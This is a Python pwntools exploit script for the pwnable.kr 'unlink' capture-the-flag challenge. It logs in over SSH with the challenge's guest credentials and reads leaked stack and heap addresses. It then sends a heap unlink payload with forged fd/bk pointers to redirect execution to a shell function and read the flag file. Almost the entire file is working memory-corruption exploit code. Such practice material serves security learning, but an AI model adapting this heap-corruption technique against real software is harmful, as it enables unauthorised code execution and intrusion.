#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwnable.kr --port 2222 --user unlink --password guest --path /home/unlink/unlink
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('unlink')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'unlink'
password = args.PASSWORD or 'guest'
remote_path = '/home/unlink/unlink'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

output_stack_leak = io.recvline(keepends=False).decode()
output_heap_leak = io.recvline(keepends=False).decode()

base_stack_address = int(output_stack_leak.split(' ')[-1], 16)
base_heap_address = int(output_heap_leak.split(' ')[-1], 16)

start_of_A_buf = base_heap_address + 0x8

shell_func_address = p32(0x080484eb)

junk_before_pointers = 4 * 'AAAA' # locally needs to be 6 * 'AAAA' and adjust 0x338 to 0x340 respectively
junk_after_pointers = 200 * 'AAAA'

fd = p32(start_of_A_buf + 0x338 + 0x4) # 0x338 = hex(4 * 4 + 4 + 4 + 200 * 4) (the address where we put shell_func_adderss)
bk = p32(base_stack_address + 0x10)


inputt = junk_before_pointers + fd + bk + junk_after_pointers + shell_func_address

io.sendline(inputt)
io.interactive() # for some reason it seems to not work with sending cat ./flag, hence the interactive
io.sendline(b'cat ./flag')

io.recvline(keepends=False).decode()
flag_output = io.recvline(keepends=False).decode()

print(flag_output)
